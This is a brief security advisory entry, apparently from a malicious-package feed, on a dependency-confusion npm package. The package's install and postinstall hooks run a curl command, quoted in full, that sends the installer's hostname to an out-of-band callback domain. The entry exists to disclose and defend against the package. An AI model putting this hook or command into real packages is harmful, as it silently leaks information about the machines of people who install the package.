summary: Dependency-confusion package exfiltrates hostname to attacker callback domain on install
details: package.json declares both `install` and `postinstall` lifecycle scripts that run `curl https://d8g1g8c86mdq190585kgfijgspz7hwfwc.oast.site/info/?hostname=$(hostname)` automatically during `npm install`, sending the installer's hostname to an out-of-band-callback (interactsh-style) domain controlled by a third party. The package is published at version 999.9.10 with the description 'SAFE PoC - Demonstrates dependency confusion' — the canonical shape of a dependency-confusion attack designed to shadow an internal package of the same name in a victim's build system. Regardless of stated intent, any installer whose resolver picks this version up runs the exfiltration on install with no opt-out, leaking the host identifier to an attacker-observable endpoint.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
